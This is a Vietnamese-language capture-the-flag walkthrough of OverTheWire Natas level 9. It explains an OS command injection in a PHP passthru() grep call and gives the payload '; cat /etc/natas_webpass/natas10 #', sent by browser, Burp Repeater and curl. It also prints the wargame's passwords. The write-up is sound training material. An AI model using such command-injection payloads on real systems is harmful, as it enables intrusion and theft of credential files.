# Level 9 -> Level 10

Find words containing: [      ] [Search]

Output:

---

## 1. THÔNG TIN TRUY CẬP (DÙNG PASSWORD TÌM ĐƯỢC TỪ NATAS 8)

- **URL**: `http://natas9.natas.labs.overthewire.org`
- **Username**: `natas9`
- **Password**: `UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9`
- **Giao thức xác thực**: HTTP Basic Authentication

---

## 2. THỬ THÁCH & KIẾN THỨC NỀN TẢNG CỦA LEVEL 9

### Thử thách
Trang web cung cấp một tính năng tra cứu từ điển: người dùng nhập vào một từ hoặc một cụm ký tự bất kỳ (`needle`), hệ thống sẽ tìm kiếm và in ra các dòng chứa từ đó trong cuốn từ điển `dictionary.txt`.

Bên dưới có liên kết **`View sourcecode`**.

### Phân tích mã nguồn PHP (`index-source.html`)
Khi mở mã nguồn, ta đọc được đoạn mã xử lý sau:

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

### Manh mối & Kiến thức cốt lõi: Lỗ hổng chèn lệnh hệ điều hành (OS Command Injection)

1. **Hàm `passthru()` trong PHP**:
   - `passthru()` là hàm dùng để truyền và thực thi trực tiếp một câu lệnh hệ điều hành Linux (tương tự như ta gõ lệnh trực tiếp trên terminal của Bandit). Toàn bộ kết quả đầu ra thô của lệnh sẽ được in thẳng ra màn hình trình duyệt.

2. **Lỗ hổng Command Injection là gì?**:
   - Lỗ hổng xảy ra khi ứng dụng web lấy dữ liệu đầu vào từ người dùng (ở đây là biến `$key`) rồi ghép thẳng vào chuỗi câu lệnh hệ thống:
     ```php
     "grep -i $key dictionary.txt"
     ```
     mà **hoàn toàn không có cơ chế lọc, kiểm tra (sanitization) hay escape các ký tự đặc biệt của shell**.
   - Điều này cho phép kẻ tấn công chèn các toán tử điều khiển của Linux shell (như `;`, `&`, `&&`, `|`, `#`) để bẻ gãy cấu trúc câu lệnh ban đầu và ép máy chủ thực thi các lệnh tùy ý với quyền hạn của tiến trình web.

3. **Phân tích cơ chế hoạt động của Payload**:
   - Mật khẩu của `natas10` được lưu cố định tại: `/etc/natas_webpass/natas10`.
   - Lệnh Linux để đọc nội dung file là: `cat /etc/natas_webpass/natas10`.
   - **Xây dựng Payload**:
     ```text
     ; cat /etc/natas_webpass/natas10 #
     ```
   - **Khi ghép vào câu lệnh gốc của máy chủ**:
     ```bash
     grep -i ; cat /etc/natas_webpass/natas10 # dictionary.txt
     ```
   - **Bash shell sẽ diễn giải câu lệnh như sau**:
     1. `grep -i `: Lệnh thứ nhất (thiếu tham số, shell bỏ qua hoặc báo lỗi nhẹ).
     2. `;` (Dấu chấm phẩy): Ký tự phân tách các câu lệnh độc lập trong Linux shell, báo hiệu kết thúc lệnh trước để bắt đầu lệnh kế tiếp.
     3. `cat /etc/natas_webpass/natas10`: Câu lệnh thứ hai do ta chèn vào, đọc trực tiếp tệp mật khẩu của `natas10`.
     4. `#` (Dấu thăng): Biến phần còn lại phía sau (`dictionary.txt`) thành chú thích (comment) của shell, loại bỏ hoàn toàn phần dư thừa tránh gây lỗi cú pháp.

---

## 3. CÔNG CỤ CẦN DÙNG

- **Trình duyệt Web**: Nhập payload trực tiếp vào ô tìm kiếm.
- **Burp Suite**: Bắt và chỉnh sửa tham số GET `needle`.
- **Dòng lệnh CLI (cURL)**: Gửi request chèn lệnh trực tiếp từ terminal.

---

## 4. CÁC BƯỚC THỰC HIỆN ĐỂ LẤY PASSWORD LEVEL 10

### Cách 1: Thao tác trực tiếp trên Trình duyệt (Khuyên dùng)

- **Bước 1**: Mở trình duyệt và truy cập đường dẫn:
  ```text
  http://natas9.natas.labs.overthewire.org
  ```
  Đăng nhập với tài khoản:
  - **User**: `natas9`
  - **Pass**: `UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9`

- **Bước 2**: Nhấp vào liên kết **View sourcecode** hoặc truy cập đường dẫn:
  ```text
  http://natas9.natas.labs.overthewire.org/index-source.html
  ```
  Phát hiện hàm thực thi dòng lệnh hệ thống `passthru("grep -i $key dictionary.txt");`.

- **Bước 3**: Quay lại trang chủ:
  ```text
  http://natas9.natas.labs.overthewire.org
  ```

- **Bước 4**: Dán chính xác chuỗi payload sau vào ô **Find words containing**:
  ```text
  ; cat /etc/natas_webpass/natas10 #
  ```

- **Bước 5**: Nhấn nút **Search**.
  - Phần **Output** bên dưới sẽ in ra chuỗi mật khẩu của `natas10`!

---

### Cách 2: Sử dụng Burp Suite

- **Bước 1**: Mở trình duyệt của Burp Suite (`Open browser`) và truy cập đường dẫn:
  ```text
  http://natas9.natas.labs.overthewire.org
  ```
  Đăng nhập với tài khoản:
  - **User**: `natas9`
  - **Pass**: `UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9`

- **Bước 2**: Quay lại Burp Suite, vào tab **`Proxy`** $\rightarrow$ **`HTTP history`** $\rightarrow$ Click chuột phải vào request `natas9` (Status `200`) $\rightarrow$ chọn **`Send to Repeater`** (`Ctrl + R`).
- **Bước 3**: Tại tab **`Repeater`**, sửa dòng request đầu tiên thành:
  ```http
  GET /?needle=%3B+cat+%2Fetc%2Fnatas_webpass%2Fnatas10+%23&submit=Search HTTP/1.1
  ```
  *(Các ký tự đặc biệt `;`, khoảng trắng, `/`, `#` đã được mã hóa URL Encoding tương ứng).*
- **Bước 4**: Bấm nút màu cam **`Send`**. Khung **Response** bên phải sẽ trả về mật khẩu của `natas10`.

---

### Cách 3: Sử dụng dòng lệnh PowerShell / Terminal với cURL

Gửi HTTP request trực tiếp với payload chèn lệnh (lưu ý dùng `%23` đại diện cho dấu `#` trong URL):

```powershell
curl.exe -s -u natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9 "http://natas9.natas.labs.overthewire.org/?needle=;cat+/etc/natas_webpass/natas10+%23&submit=Search"
```

---

## 5. KẾT QUẢ / MẬT KHẨU LEVEL 10

```text
Password natas10: [EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv]
```
